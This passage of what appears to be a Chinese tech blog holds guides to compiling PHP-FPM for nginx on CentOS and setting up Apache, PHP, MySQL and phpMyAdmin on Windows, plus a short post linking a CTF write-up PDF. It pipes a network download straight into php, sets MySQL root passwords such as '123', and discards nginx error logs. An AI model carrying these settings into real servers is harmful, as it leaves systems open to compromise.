title="编译安装PHP-fpm"></a>编译安装PHP-fpm</h1><p>Nginx本身不能处理PHP，作为web服务器，当它接收到请求后，不支持对外部程序的直接调用或者解析，必须通过FastCGI进行调用。如果是PHP请求，则交给PHP解释器处理，并把结果返回给客户端。PHP-FPM是支持解析php的一个FastCGI进程管理器。提供了更好管理PHP进程的方式，可以有效控制内存和进程、可以平滑重载PHP配置。</p><h2 id="安装依赖包"><a href="#安装依赖包" class="headerlink" title="安装依赖包"></a>安装依赖包</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[www@root@/home/www@31]$</span><span class="bash"> yum install -y libmcrypt* mhash* libxml2 libxml2-devel bzip2 bzip2-devel freetype.x86_64 freetype-devel.x86_64 libjpeg-turbo-devel libcurl-devel libpng libpng-devel</span></span><br></pre></td></tr></table></figure><p>可能会提示：<code>No package libmcrypt* available.</code><br>此时拓展下更新源然后更新下就OK了</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[www@root@/home/www@32]$</span><span class="bash"> yum  install epel-release</span></span><br><span class="line"><span class="meta">[www@root@/home/www@33]$</span><span class="bash"> yum  update</span></span><br><span class="line"><span class="meta">[www@root@/home/www@34]$</span><span class="bash"> yum install libmcrypt libmcrypt-devel mcrypt mhash</span></span><br></pre></td></tr></table></figure><p>然后进入<code>make</code>目录 解压php并编译安装</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[www@root@/make@20]~$ cd php-7.2.12</span><br><span class="line">[www@root@/make/php-7.2.12@21]~$ ./configure \</span><br><span class="line">  --prefix=/usr/local/php \</span><br><span class="line">  --enable-mysqlnd \</span><br><span class="line">  --with-mysqli=mysqlnd --with-openssl \</span><br><span class="line">  --with-pdo-mysql=mysqlnd \</span><br><span class="line">  --enable-mbstring \</span><br><span class="line">  --with-freetype-dir \</span><br><span class="line">  --with-gd \</span><br><span class="line">  --with-jpeg-dir \</span><br><span class="line">  --with-png-dir \</span><br><span class="line">  --with-zlib --with-libxml-dir=/usr \</span><br><span class="line">  --enable-xml  --enable-sockets \</span><br><span class="line">  --with-mcrypt  --with-config-file-path=/etc \</span><br><span class="line">  --with-config-file-scan-dir=/etc/php.d \</span><br><span class="line">  --enable-maintainer-zts \</span><br><span class="line">  --disable-fileinfo  --with-bz2\</span><br><span class="line">  --enable-fpm\</span><br><span class="line">  --with-curl\</span><br><span class="line">  --enable-pcntl\</span><br><span class="line">  --without-pear</span><br></pre></td></tr></table></figure><p>可能会提示<code>configure: WARNING: unrecognized options: --with-mcrypt</code><br>根据:<a href="https://github.com/kasparsd/php-7-debian/issues/55" target="_blank" rel="noopener">https://github.com/kasparsd/php-7-debian/issues/55</a></p><blockquote><p>In PHP 7.2 the following configuration options are no longer supported</p><ul><li>with-mcrypt</li><li>with-mysql</li></ul><p>Remove ‘with-mcrypt’ - it’s deprecated since PHP 7.1</p></blockquote><p>PHP7.1开始已经移除了mcrypt<br>因此删除上面的 <code>--with-mcrypt  --with-config-file-path=/etc \</code>再执行遍</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[www@root@/make/php-7.2.12@22]~$ ./configure \</span><br><span class="line">  --prefix=/usr/local/php \</span><br><span class="line">  --enable-mysqlnd \</span><br><span class="line">  --with-mysqli=mysqlnd --with-openssl \</span><br><span class="line">  --with-pdo-mysql=mysqlnd \</span><br><span class="line">  --enable-mbstring \</span><br><span class="line">  --with-freetype-dir \</span><br><span class="line">  --with-gd \</span><br><span class="line">  --with-jpeg-dir \</span><br><span class="line">  --with-png-dir \</span><br><span class="line">  --with-zlib --with-libxml-dir=/usr \</span><br><span class="line">  --enable-xml  --enable-sockets \</span><br><span class="line">  --with-config-file-scan-dir=/etc/php.d \</span><br><span class="line">  --enable-maintainer-zts \</span><br><span class="line">  --disable-fileinfo  --with-bz2\</span><br><span class="line">  --enable-fpm\</span><br><span class="line">  --with-curl\</span><br><span class="line">  --enable-pcntl\</span><br><span class="line">  --without-pear</span><br></pre></td></tr></table></figure><p>然后<code>make -j6 &amp;&amp; make -j6 install</code></p><h2 id="添加php和php-fpm配置文件"><a href="#添加php和php-fpm配置文件" class="headerlink" title="添加php和php-fpm配置文件"></a>添加php和php-fpm配置文件</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[www@root@/make@30]~$ cp /make/php-7.2.12/php.ini-production /etc/php.ini</span><br><span class="line">[www@root@/make@31]~$ cd /usr/local/php/etc/</span><br><span class="line">[www@root@/make@32]~$ cp php-fpm.conf.default php-fpm.conf</span><br><span class="line">[www@root@/usr/local/php/etc@33]~$ sed -i 's@;pid = run/php-fpm.pid@pid = /usr/local/php/var/run/php-fpm.pid@' php-fpm.conf</span><br></pre></td></tr></table></figure><h2 id="设置PHP环境变量"><a href="#设置PHP环境变量" class="headerlink" title="设置PHP环境变量"></a>设置PHP环境变量</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[www@root@/usr/local/php/etc@34]~$ vi /root/.bash_profile</span><br><span class="line">PATH=$PATH:$HOME/bin:/usr/local/mysql/bin:/usr/local/mysql/lib:/usr/local/php/bin</span><br></pre></td></tr></table></figure><p>在PATH后面加上<code>/usr/local/php/bin</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[www@root@/usr/local/php/etc@35]~$ source /root/.bash_profile  #重新执行文件</span><br></pre></td></tr></table></figure><h2 id="添加php-fpm启动脚本"><a href="#添加php-fpm启动脚本" class="headerlink" title="添加php-fpm启动脚本"></a>添加php-fpm启动脚本</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[www@root@/usr/local/php/etc@36]~$ cp /make/php-7.2.12/sapi/fpm/init.d.php-fpm /etc/init.d/php-fpm</span><br><span class="line">[www@root@/usr/local/php/etc@37]~$ chmod +x /etc/init.d/php-fpm</span><br></pre></td></tr></table></figure><h2 id="添加php-fpm至服务列表并设置开机自启"><a href="#添加php-fpm至服务列表并设置开机自启" class="headerlink" title="添加php-fpm至服务列表并设置开机自启"></a>添加php-fpm至服务列表并设置开机自启</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[www@root@/usr/local/php/etc@38]~$ chkconfig --add php-fpm  </span><br><span class="line">[www@root@/usr/local/php/etc@39]~$ chkconfig --list php-fpm</span><br><span class="line"></span><br><span class="line">Note: This output shows SysV services only and does not include native</span><br><span class="line">      systemd services. SysV configuration data might be overridden by native</span><br><span class="line">      systemd configuration.</span><br><span class="line"></span><br><span class="line">      If you want to list systemd services use 'systemctl list-unit-files'.</span><br><span class="line">      To see services enabled on particular target use</span><br><span class="line">      'systemctl list-dependencies [target]'.</span><br><span class="line"></span><br><span class="line">php-fpm        0:off1:off2:on3:on4:on5:on6:off</span><br><span class="line">[www@root@/usr/local/php/etc@40]~$ chkconfig php-fpm on</span><br><span class="line">[www@root@/usr/local/php/etc@41]~$ cd /usr/local/php/etc/php-fpm.d</span><br><span class="line">[www@root@/usr/local/php/etc/php-fpm.d@42]~$ cp www.conf.default www.conf</span><br></pre></td></tr></table></figure><h2 id="启动服务-1"><a href="#启动服务-1" class="headerlink" title="启动服务"></a>启动服务</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[www@root@/usr/local/php/etc/php-fpm.d@43]~$ service php-fpm start</span><br><span class="line">Starting php-fpm  done</span><br></pre></td></tr></table></figure><h2 id="添加nginx对fastcgi的支持"><a href="#添加nginx对fastcgi的支持" class="headerlink" title="添加nginx对fastcgi的支持"></a>添加nginx对fastcgi的支持</h2><h3 id="主文件模式"><a href="#主文件模式" class="headerlink" title="主文件模式"></a>主文件模式</h3><p><strong>该步骤选做</strong><br>默认的配置文件</p><p>cp /etc/nginx/nginx.conf /etc/nginx/nginx.conf.bak<br>cp /etc/nginx/nginx.conf.default /etc/nginx/nginx.conf</p><p>编辑<code>/etc/nginx/nginx.conf</code>，在所支持的主页面格式中添加php格式的主页，类似如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location &#x2F; &#123;</span><br><span class="line">    root   &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;html;</span><br><span class="line">    index  index.php index.html index.htm;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>取消一下内容前面的注释</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location ~ \.php$ &#123;</span><br><span class="line">    root           &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;html&#x2F;;</span><br><span class="line">    fastcgi_pass    127.0.0.1:9000;</span><br><span class="line">    fastcgi_index   index.php;</span><br><span class="line">    fastcgi_param  SCRIPT_FILENAME  $doucment_root$fastcgi_script_name;</span><br><span class="line">    include        fastcgi_params;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重新载入nginx的配置文件。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">service nginx reload</span><br></pre></td></tr></table></figure><h3 id="虚拟主机模式"><a href="#虚拟主机模式" class="headerlink" title="虚拟主机模式"></a>虚拟主机模式</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server</span><br><span class="line">&#123;</span><br><span class="line">    listen 80; #监听端口</span><br><span class="line">    listen [::]:80; #IPV6支持</span><br><span class="line">    #listen 443 spdy; #https</span><br><span class="line">    #listen [::]:443 spdy; #IPV6 HTTPS</span><br><span class="line">    server_name www.example.com; #您的域名</span><br><span class="line">    index index.php index.html index.php;</span><br><span class="line"></span><br><span class="line">    set $subdomain &#39;&#39;;</span><br><span class="line">    root  &#x2F;home&#x2F;www&#x2F;www_example_com$subdomain;</span><br><span class="line">    #include &#x2F;home&#x2F;www&#x2F;rewrite&#x2F;xxx.conf; #包含rewrite规则文件</span><br><span class="line">    </span><br><span class="line">    ### SSL 配置，如果您需要，请取消本段的注释并做好配置</span><br><span class="line">    #ssl on;</span><br><span class="line">    #ssl_protocols TLSv1.2 TLSv1.1 TLSv1;</span><br><span class="line">    #ssl_ciphers CHACHA20:GCM:CFB:HIGH:!DH:!RC4:!aNULL:!eNULL:!LOW:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS;</span><br><span class="line">    #add_header Strict-Transport-Security &quot;max-age&#x3D;31536000; includeSubdomains; preload&quot;;</span><br><span class="line">    #ssl_prefer_server_ciphers on;</span><br><span class="line">    #ssl_stapling on;</span><br><span class="line">    #ssl_stapling_verify on;</span><br><span class="line">    #ssl_certificate &#x2F;path&#x2F;to&#x2F;public.crt;</span><br><span class="line">    #ssl_certificate_key &#x2F;path&#x2F;to&#x2F;private.key;</span><br><span class="line">    ############</span><br><span class="line"></span><br><span class="line">    location ~ \.php$ </span><br><span class="line">    &#123;</span><br><span class="line">        root            &#x2F;home&#x2F;www&#x2F;www_example_com&#x2F;;</span><br><span class="line">        fastcgi_pass    127.0.0.1:9000;</span><br><span class="line">        fastcgi_index   index.php;</span><br><span class="line">        fastcgi_param  SCRIPT_FILENAME  &#x2F;home&#x2F;www&#x2F;www_example_com&#x2F;$fastcgi_script_name;</span><br><span class="line">        include        fastcgi_params;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location ~ .*.(gif|jpg|jpeg|png|bmp|swf|flv|mp3|wma)$</span><br><span class="line">    &#123;</span><br><span class="line">        expires      30d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location ~ .*.(js|css)$</span><br><span class="line">    &#123;</span><br><span class="line">        expires      12h;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    access_log off; </span><br><span class="line">    error_log &#x2F;dev&#x2F;null; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="安装composer"><a href="#安装composer" class="headerlink" title="安装composer"></a>安装composer</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -sS https://getcomposer.org/installer | php</span><br><span class="line">mv composer.phar /usr/local/bin/composer</span><br></pre></td></tr></table></figure><h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><p>此时mysql是空密码。</p><p>安全起见，需要设置密码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; set password for &#39;root&#39;@&#39;localhost&#39;&#x3D;password(&#39;123&#39;);</span><br><span class="line">mysql&gt; flush privileges;</span><br></pre></td></tr></table></figure><p>nginx设置后可能会出现报错<code>File not found</code><br>检查<code>location ~ .php$</code>配置项，发现了一行<code>fastcgi_param</code>的配置，然后将其改成了nginx的默认web目录，再次重启nginx服务后，发现可以进行访问了。<br><code>fastcgi_param  SCRIPT_FILENAME /home/www/www_example_com/$fastcgi_script_name;</code></p><p>至此 LNMP部署完毕</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> centos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>X-NUCA CTF 1~3 Write-Up</title>
      <link href="/p/3354270344.html"/>
      <url>/p/3354270344.html</url>
      
        <content type="html"><![CDATA[<p>2017年XNUCA Writeup</p><a id="more"></a><p><strong>第一次玩这个，直接PDF文件吧</strong><br><strong>第四关加了个WAF过不去 mmp。。。。</strong><br><strong>1~3关WRITEUP</strong></p><p><a href="http://cnspace-1251949277.cosbj.myqcloud.com/pdf/QISI.pdf" target="_blank" rel="noopener">下载PDF</a></p>]]></content>
      
      
      <categories>
          
          <category> X-NUCA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows下部署WAMP</title>
      <link href="/p/1786556225.html"/>
      <url>/p/1786556225.html</url>
      
        <content type="html"><![CDATA[<p>记录下Windows Server 2016 X64下手动部署Apache 2.4.29+MySQL5.7+PHP7+phpMyAdmin4.7.6</p><a id="more"></a><p>环境：</p><blockquote><p>Windows Server2016 DataCenter x64<br>Apache2.4.9<br>PHP7.2<br>MySQL5.7.2<br>phpMyAdmin4.7.6</p></blockquote><p>系统需要安装VC常用环境，文末提供下载。</p><hr><h1 id="Apache下载-amp-配置"><a href="#Apache下载-amp-配置" class="headerlink" title="Apache下载&amp;配置"></a>Apache下载&amp;配置</h1><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>Apache官网下载<code>http://httpd.apache.org/</code><br>下载最新的Apache<br><img src= "/img/loading.gif" data-lazy-src="/images/9cibSkm.png" alt=""><br>由于Apache没有编译好的可执行文件因此只能下载别的平台编译好的<br><img src= "/img/loading.gif" data-lazy-src="/images/6Q3euV3.png" alt=""><br>这里我们第一个ApacheHaus为例。<br><img src= "/img/loading.gif" data-lazy-src="/images/lqzschB.png" alt=""><br>这里以VC14为例<br><img src= "/img/loading.gif" data-lazy-src="/images/WJIhIwo.png" alt=""><br>下载，注意64位和32位以及OpenSSL模块版本<br><img src= "/img/loading.gif" data-lazy-src="/images/HcBGfxh.png" alt=""><br>下载完是个压缩包<br><img src= "/img/loading.gif" data-lazy-src="/images/s2QrIhE.png" alt=""><br>移动到想放的地方并解压<strong>（D盘为例）</strong><br>然后把解压后的Apache24目录移动到D盘根目录<br>最后效果如下<br><img src= "/img/loading.gif" data-lazy-src="/images/ojLqMfu.png" alt=""></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>CMD进入<code>Apache</code>的<code>bin</code>目录<br>CMD执行<code>httpd -?</code>可以看到httpd所有可用参数</p><figure class="highlight ps"><table><tr><td class="code"><pre><span class="line">D:\Apache24\bin&gt;httpd -?</span><br><span class="line">Usage: httpd [-D name] [-d directory] [-f file]</span><br><span class="line">             [-C <span class="string">"directive"</span>] [-c <span class="string">"directive"</span>]</span><br><span class="line">             [-w] [-k start|restart|stop|shutdown] [-n service_name]</span><br><span class="line">             [-k install|config|uninstall] [-n service_name]</span><br><span class="line">             [-v] [-V] [-h] [-l] [-L] [-t] [-T] [-S] [-X]</span><br><span class="line">Options:</span><br><span class="line">  -D name            : define a name <span class="keyword">for</span> use <span class="keyword">in</span> &lt;IfDefine name&gt; directives</span><br><span class="line">  -d directory       : specify an alternate initial ServerRoot</span><br><span class="line">  -f file            : specify an alternate ServerConfigFile</span><br><span class="line">  -C <span class="string">"directive"</span>     : <span class="keyword">process</span> directive before reading config files</span><br><span class="line">  -c <span class="string">"directive"</span>     : <span class="keyword">process</span> directive after reading config files</span><br><span class="line">  -n name            : set service name and use its ServerConfigFile and ServerRoot</span><br><span class="line">  -k start           : tell Apache to start</span><br><span class="line">  -k restart         : tell running Apache to <span class="keyword">do</span> a graceful restart</span><br><span class="line">  -k stop|shutdown   : tell running Apache to shutdown</span><br><span class="line">  -k install         : install an Apache service</span><br><span class="line">  -k config          : change startup Options of an Apache service</span><br><span class="line">  -k uninstall       : uninstall an Apache service</span><br><span class="line">  -w                 : hold open the console window on error</span><br><span class="line">  -e level           : show startup errors of level (see LogLevel)</span><br><span class="line">  -E file            : log startup errors to file</span><br><span class="line">  -v                 : show version number</span><br><span class="line">  -V                 : show compile settings</span><br><span class="line">  -h                 : list available command line options (this page)</span><br><span class="line">  -l                 : list compiled <span class="keyword">in</span> modules</span><br><span class="line">  -L                 : list available configuration directives</span><br><span class="line">  -t -D DUMP_VHOSTS  : show parsed vhost settings</span><br><span class="line">  -t -D DUMP_RUN_CFG : show parsed run settings</span><br><span class="line">  -S                 : a synonym <span class="keyword">for</span> -t -D DUMP_VHOSTS -D DUMP_RUN_CFG</span><br><span class="line">  -t -D DUMP_MODULES : show all loaded modules</span><br><span class="line">  -M                 : a synonym <span class="keyword">for</span> -t -D DUMP_MODULES</span><br><span class="line">  -t -D DUMP_INCLUDES: show all included configuration files</span><br><span class="line">  -t                 : run syntax check <span class="keyword">for</span> config files</span><br><span class="line">  -T                 : start without DocumentRoot(s) check</span><br><span class="line">  -X                 : debug mode (only one worker, <span class="keyword">do</span> not detach)</span><br></pre></td></tr></table></figure><p>这里因为要安装为服务且不用默认名，所以执行<br>    httpd -n Apache24_test -k install<br>执行完会报错，因为#<code>httpd.conf</code>第38行左右没有设置正确路径（默认是<code>/Apache24</code>）<br><img src= "/img/loading.gif" data-lazy-src="/images/oEvuV9o.png" alt=""><br>找到第38行，然后改为正确的<code>Apache24</code>根路径</p><blockquote></blockquote><p>Define SRVROOT “D:\Apache24”<br>ServerRoot “${SRVROOT}”</p><p>默认网站路径是<code>${SRVROOT}\htdocs</code>,在<code>httpd.conf</code>中<code>251</code>行左右可以修改，我修改为<code>${SRVROOT}\WWW</code></p><p>然后进入服务中启动Apache24进程即可，或者用<code>ApacheMonitor.exe</code>【推荐】进行控制<br><img src= "/img/loading.gif" data-lazy-src="/images/1bmqmit.png" alt=""><br>浏览器访问localhost，见到如下图界面即为配置且启动成功<br><img src= "/img/loading.gif" data-lazy-src="/images/GPRF0L2.png" alt=""></p><hr><h1 id="PHP下载-安装"><a href="#PHP下载-安装" class="headerlink" title="PHP下载+安装"></a>PHP下载+安装</h1><h2 id="下载-1"><a href="#下载-1" class="headerlink" title="下载"></a>下载</h2><p>PHP官网下载网址<code>http://www.php.net/downloads.php</code><br><img src= "/img/loading.gif" data-lazy-src="/images/JXDLgsw.png" alt=""><br>这里我选择线程安全X64版本<br><img src= "/img/loading.gif" data-lazy-src="/images/VX0lgA6.png" alt=""><br>下载后<br><img src= "/img/loading.gif" data-lazy-src="/images/xDqzKMT.png" alt=""></p><h2 id="安装【解压】"><a href="#安装【解压】" class="headerlink" title="安装【解压】"></a>安装【解压】</h2><p>解压到D盘，目录重命名为PHP7<br><img src= "/img/loading.gif" data-lazy-src="/images/WwhwRFi.png" alt=""><br>然后进入<code>D:\PHP7</code>修改<code>php.ini-development</code>为<code>php.ini</code><br><img src= "/img/loading.gif" data-lazy-src="/images/XbOVcWX.png" alt=""><br><code>development</code>为开发环境，<code>production</code>为产品环境，如果要上线，更改<code>production</code>为<code>php.ini</code><br>然后设置环境变量<br><img src= "/img/loading.gif" data-lazy-src="/images/liZa1hT.png" alt=""><br>测试是否成功<br>cmd执行php –v<br><img src= "/img/loading.gif" data-lazy-src="/images/Im3Ogqv.png" alt=""></p><h2 id="整合进Apache"><a href="#整合进Apache" class="headerlink" title="整合进Apache"></a>整合进Apache</h2><p>进入<code>D:\Apache24\conf</code>目录对<code>httpd.conf</code>文件进行编辑<br>在<code>181</code>行后添加PHP支持【<code>httpd.conf</code>文件注释语法为<code>#</code>】</p><blockquote><p>LoadModule php7_module D:/php7/php7apache2_4.dll<br>AddType application/x-httpd-php .php<br>PhpIniDir D:/php7</p></blockquote><p>文件改后如下图所示<br><img src= "/img/loading.gif" data-lazy-src="/images/VoCF1GD.png" alt=""></p><h2 id="配置PHP支持MySQL"><a href="#配置PHP支持MySQL" class="headerlink" title="配置PHP支持MySQL"></a>配置PHP支持MySQL</h2><p>进入<code>D:/php7</code>，编辑<code>php.ini</code>中<code>898</code>行和<code>902</code>行左右，使PHP对MySQL支持【PHP中注释为;】<br><img src= "/img/loading.gif" data-lazy-src="/images/IO0UMnN.png" alt=""></p><h2 id="设置拓展目录"><a href="#设置拓展目录" class="headerlink" title="设置拓展目录"></a>设置拓展目录</h2><p>编辑<code>732</code>行，设置PHP拓展目录<br><img src= "/img/loading.gif" data-lazy-src="/images/m0XviPS.png" alt=""></p><h2 id="设置时区"><a href="#设置时区" class="headerlink" title="设置时区"></a>设置时区</h2><p>编辑<code>932</code>为<code>date.timezone = PRC</code><br><img src= "/img/loading.gif" data-lazy-src="/images/cPG1AKh.png" alt=""></p><h2 id="Apache设置PHP首页文件"><a href="#Apache设置PHP首页文件" class="headerlink" title="Apache设置PHP首页文件"></a>Apache设置PHP首页文件</h2><p>编辑<code>httpd.conf</code>第<code>284</code>行<br><img src= "/img/loading.gif" data-lazy-src="/images/UAlgBNi.png" alt=""></p><h2 id="测试PHP-Apache"><a href="#测试PHP-Apache" class="headerlink" title="测试PHP+Apache"></a>测试PHP+Apache</h2><p>在<code>D:\Apache24\WWW</code>下新建index.php文件，内容是</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>保存，本地访问localhost，出现如下图表示配置成功<br><img src= "/img/loading.gif" data-lazy-src="/images/Wymd1r8.png" alt=""></p><hr><h1 id="下载-amp-配置MySQL"><a href="#下载-amp-配置MySQL" class="headerlink" title="下载&amp;配置MySQL"></a>下载&amp;配置MySQL</h1><h2 id="下载-2"><a href="#下载-2" class="headerlink" title="下载"></a>下载</h2><p>下载地址<code>https://dev.mysql.com/downloads/mysql/</code><br>进入后往下拉<br><img src= "/img/loading.gif" data-lazy-src="/images/2a3nYxa.png" alt=""><br>选择X64版本的Zip是因为方便【好吧，我承认我懒】，图片中下面那个是用于开发测试的版本<br>这一步会提示登录帐号，不用管，直接下载<br><img src= "/img/loading.gif" data-lazy-src="/images/BMIaXZb.png" alt=""></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>下载后解压重命名为<code>mysql57</code>并移动到D盘根目录，这时D盘目录如下图<br><img src= "/img/loading.gif" data-lazy-src="/images/8ci70fB.png" alt=""><br>然后进入<code>mysql</code>根目录，新建<strong>data空文件夹</strong>和<code>my.ini</code><br><code>my.ini</code>代码如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[mysql]</span><br><span class="line"># 设置mysql客户端默认字符集</span><br><span class="line">default-character-set&#x3D;utf8 </span><br><span class="line">[mysqld]</span><br><span class="line">#设置3306端口</span><br><span class="line">port &#x3D; 3306 </span><br><span class="line"># 设置mysql的安装目录</span><br><span class="line">basedir&#x3D;D:\mysql57</span><br><span class="line"># 设置mysql数据库的数据的存放目录</span><br><span class="line">datadir&#x3D;D:\mysql57\data</span><br><span class="line"># 允许最大连接数</span><br><span class="line">max_connections&#x3D;200</span><br><span class="line"># 服务端使用的字符集默认为8比特编码的latin1字符集</span><br><span class="line">character-set-server&#x3D;utf8</span><br><span class="line"># 创建新表时将使用的默认存储引擎</span><br><span class="line">default-storage-engine&#x3D;INNODB</span><br></pre></td></tr></table></figure><p>保存后cmd进入<code>mysql57/bin</code><br>执行<code>mysqld --verbose --help</code>会提示帮助</p><figure class="highlight ps"><table><tr><td class="code"><pre><span class="line">D:\mysql57\bin&gt;mysqld --verbose --help</span><br><span class="line">mysqld  Ver <span class="number">5.7</span>.<span class="number">20</span> <span class="keyword">for</span> Win64 on x86_64 (MySQL Community Server (GPL))</span><br><span class="line">Copyright (c) <span class="number">2000</span>, <span class="number">2017</span>, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Starts the MySQL database server.</span><br><span class="line"></span><br><span class="line">Usage: mysqld [OPTIONS]</span><br><span class="line">NT and Win32 specific options:</span><br><span class="line">  --install                     Install the default service (NT).</span><br><span class="line">  --install-manual              Install the default service started manually (NT).</span><br><span class="line">  --install service_name        Install an optional service (NT).</span><br><span class="line">  --install-manual service_name Install an optional service started manually (NT).</span><br><span class="line">  --remove                      Remove the default service from the service list (NT).</span><br><span class="line">  --remove service_name         Remove the service_name from the service list (NT).</span><br><span class="line">  --enable-named-pipe           Only to be used <span class="keyword">for</span> the default server (NT).</span><br><span class="line">  --standalone                  Dummy option to start as a standalone server (NT).</span><br><span class="line">以下省略</span><br></pre></td></tr></table></figure><p>执行<code>mysqld --initialize-insecure --user=mysql</code>，文档表明，MySQL5.7.6后自带数据库，使用-initialize生成随机密码，使用-initialize-insecure生成空密码。默认帐号root,后面的-user=mysql不更改<br><img src= "/img/loading.gif" data-lazy-src="/images/xY6QbMW.png" alt=""><br>然后<code>bin</code>目录下执行<code>mysqld install mysql57</code><br><img src= "/img/loading.gif" data-lazy-src="/images/eUtASIX.png" alt=""><br>由于默认是空密码，所以执行<code>mysqladmin -u root -p password</code>设置密码<br><img src= "/img/loading.gif" data-lazy-src="/images/kSrHeYb.png" alt=""><br>然后执行<code>net start mysql57</code><br><img src= "/img/loading.gif" data-lazy-src="/images/3KbH4Jx.png" alt=""></p><p>方便以后使用，新建环境变量<code>D:\mysql57\bin</code><br><img src= "/img/loading.gif" data-lazy-src="/images/JaB7A4a.png" alt=""></p><h2 id="测试连接数据库"><a href="#测试连接数据库" class="headerlink" title="测试连接数据库"></a>测试连接数据库</h2><p>代码如下<br>    test.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$link = mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">'123456789'</span>);<span class="comment">//如果连接成功,会返回一个连接的标识，PHP7中去除了mysql_connect，改用mysqli_connect;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($link)&#123; <span class="comment">//如果有数据库连接标识,则为连接成功</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"连接数据库成功"</span>; <span class="comment">//echo是输出的意思</span></span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123; <span class="comment">//没有返回标识,则连接数据库失败</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"连接数据库失败"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="/images/qG1I8CW.png" alt=""></p><h1 id="配置phpMyAdmin"><a href="#配置phpMyAdmin" class="headerlink" title="配置phpMyAdmin"></a>配置phpMyAdmin</h1><p>下载连接：<code>https://www.phpmyadmin.net/</code><br><img src= "/img/loading.gif" data-lazy-src="/images/RwtkJH3.png" alt=""></p><h2 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h2><p>解压，改名为<code>phpMyAdmin</code>扔进<code>web</code>目录<code>【D:\Apache24\WWW】</code><br><img src= "/img/loading.gif" data-lazy-src="/images/SPhbUQK.png" alt=""></p><h2 id="config-inc-php"><a href="#config-inc-php" class="headerlink" title="config.inc.php"></a>config.inc.php</h2><p>然后修改<code>phpMyAdmin</code>目录下的<code>config.sample.inc.php</code>为<code>config.inc.php</code>然后打开，编辑17行左右的<code>$cfg[&#39;blowfish_secret&#39;]=&#39;&#39;;</code>为<code>$cfg[&#39;blowfish_secret&#39;]=&#39;AbCdEfGhIjKlMn&#39;;</code>【任意字符串】<br><img src= "/img/loading.gif" data-lazy-src="/images/D5IEJyb.png" alt=""></p><h2 id="config-default-php"><a href="#config-default-php" class="headerlink" title="config.default.php"></a>config.default.php</h2><p>文件路径：<code>D:\Apache24\WWW\phpMyAdmin\libraries\config.default.php</code><br>修改以下项目：</p><h3 id="a-访问网址"><a href="#a-访问网址" class="headerlink" title="a.访问网址"></a>a.访问网址</h3><pre><code>$cfg[&apos;pmaabsoluteuri&apos;] = &apos;&apos;;这里填写phpmyadmin的访问网址</code></pre><h4 id="b-mysql主机信息"><a href="#b-mysql主机信息" class="headerlink" title="b.mysql主机信息"></a>b.mysql主机信息</h4><p><code>$cfg[&#39;servers&#39;][$i][&#39;host&#39;] = &#39;localhost&#39;; // mysql hostname or ip address填写localhost或mysql所在服务器的ip地址，如果mysql和该phpmyadmin在同一服务器，则按默认localhost$cfg[&#39;servers&#39;][$i][&#39;port&#39;] = &#39;&#39;; // mysql port - leave blank for default portmysql端口，如果是默认3306，保留为空即可</code></p><h3 id="c-mysql用户名和密码"><a href="#c-mysql用户名和密码" class="headerlink" title="c.mysql用户名和密码"></a>c.mysql用户名和密码</h3><pre><code>$cfg[&apos;servers&apos;][$i][&apos;user&apos;] = &apos;root&apos;; // mysql 